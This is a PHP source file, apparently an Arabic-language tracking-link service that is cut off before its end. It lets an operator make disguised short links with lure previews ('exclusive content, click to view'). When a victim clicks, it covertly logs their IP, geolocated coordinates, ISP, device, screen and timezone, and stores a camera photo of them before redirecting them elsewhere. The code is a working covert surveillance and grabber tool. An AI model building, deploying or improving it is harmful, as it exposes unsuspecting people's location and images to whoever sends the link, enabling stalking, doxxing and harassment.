<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتحقق والتأكد من العمل
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // إنشاء الجداول مع إضافة حقول تخصيص المعاينة (العنوان، الوصف، الصورة)
    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        title TEXT,
        description TEXT,
        image_url TEXT,
        use_camera INTEGER DEFAULT 1,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        photo TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// جلب تفاصيل المعاينة للرابط الحالي إن وجد
$og_title = "محتوى حصري ومهم - انقر للمشاهدة";
$og_description = "اضغط هنا لعرض المحتوى وتفاصيل الرابط بشكل مباشر.";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
$current_use_camera = 1;

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target =$link['target_url'];
        $current_use_camera =$link['use_camera'];
        
        if (!empty($link['title'])) $og_title =$link['title'];
        if (!empty($link['description'])) $og_description =$link['description'];
        if (!empty($link['image_url'])) $og_image =$link['image_url'];

        if (isset($_GET['check_cam'])) {
            echo json_encode(['use_camera' => $current_use_camera]);
            exit();
        }

        $public_ip = get_real_ip();
        $local_ip =$_GET['lip'] ?? 'غير متوفر';
        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
        $geo = get_ip_details($public_ip);
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $device = get_device_type($ua);
        $screen =$_GET['screen'] ?? 'غير متوفر';
        $tz =$_GET['tz'] ?? 'غير متوفر';
        $created_at = date('Y-m-d H:i:s');

        if (isset($_GET['screen'])) {
            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}

            header("Location: " . $target);
            exit();
        }
    }
}

// معالجة حفظ صورة السيلفي
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
    $code =$_POST['code'] ?? '';
    $imgData =$_POST['image'] ?? '';
    
    if (!empty($imgData) && !empty($code)) {
        $imgData = str_replace('data:image/jpeg;base64,', '',$imgData);
        $imgData = str_replace(' ', '+',$imgData);
        $decodedData = base64_decode($imgData);
        
        if (!file_exists('uploads')) {
            mkdir('uploads', 0755, true);
        }
        
        $filename = 'uploads/photo_' .$code . '_' . time() . '.jpg';
        file_put_contents($filename,$decodedData);
        
        $stmt =$db->prepare("UPDATE logs SET photo = ? WHERE code = ? ORDER BY id DESC LIMIT 1");
        $stmt->execute([$filename,$code]);
        
        echo json_encode(['status' => 'success']);
    }
    exit();
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'جازي (Djezzy)';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'أوريدو (Ooredoo)';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'اتصالات الجزائر (Algérie Télécom)';
    return trim($isp_name) ?: 'شبكة غير معروفة';
}

function get_device_type($ua) {$brand = 'جهاز ذكي';
    if (stripos($ua, 'Samsung') !== false)$brand = 'سامسونج (Samsung)';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'آيفون (iPhone)';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'هواوي (Huawei)';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false or stripos($ua, 'POCO') !== false)$brand = 'شاومي (Xiaomi)';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'أوبو (Oppo)';
    elseif (stripos($ua, 'Vivo') !== false)$brand = 'فيفو (Vivo)';
    elseif (stripos($ua, 'Realme') !== false)$brand = 'ريلمي (Realme)';

    if (stripos($ua, 'Android') !== false) return$brand . ' - أندرويد';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'حاسوب - ويندوز';
    if (stripos($ua, 'Macintosh') !== false or stripos($ua, 'Mac OS') !== false) return 'حاسوب - ماك';
    if (stripos($ua, 'Linux') !== false) return 'نظام لينكس';
    return 'جهاز غير معروف';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'الجزائر (محلي)', 'city' => 'شبكة داخلية', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'شبكة محلية (Localhost)'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'غير معروف',
            'city' => $data['city'] ?? 'غير معروف',
            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'غير معروف'];
}

// إنشاء رابط جديد مخصص بالكامل
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }
    
    $custom_title = trim($_POST['title'] ?? '');
    $custom_desc = trim($_POST['description'] ?? '');
    $custom_image = trim($_POST['image_url'] ?? '');
    $use_camera = isset($_POST['use_camera']) ? 1 : 0;

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, title, description, image_url, use_camera) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $custom_title,$custom_desc, $custom_image,$use_camera]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "
